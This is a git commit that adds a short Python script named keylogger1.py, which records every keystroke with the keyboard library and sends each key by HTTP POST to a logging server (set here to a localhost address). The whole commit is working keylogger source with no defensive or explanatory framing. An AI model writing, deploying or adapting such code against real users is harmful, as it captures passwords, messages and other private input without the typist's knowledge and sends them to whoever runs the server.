735f23a9df6dcac347dd77d42567cd8348d50925
baba <93866359+user01-1@users.noreply.github.com>
2023-09-18 16:54:36 +0900

    Create keylogger1.py
    All logged keys sent

---
+++ keylog/keylogger1.py
@@ -0,0 +1,13 @@
+import keyboard
+import requests
+
+server_url = 'http://127.0.0.1:8888/log'
+
+while True:
+    try:
+        keys = keyboard.read_event().name
+        if keys == 'enter':
+            keys = '\n'  # Convert 'Enter' data to '\n'
+        requests.post(server_url, data={'keys': keys})
+    except KeyboardInterrupt:
+        break
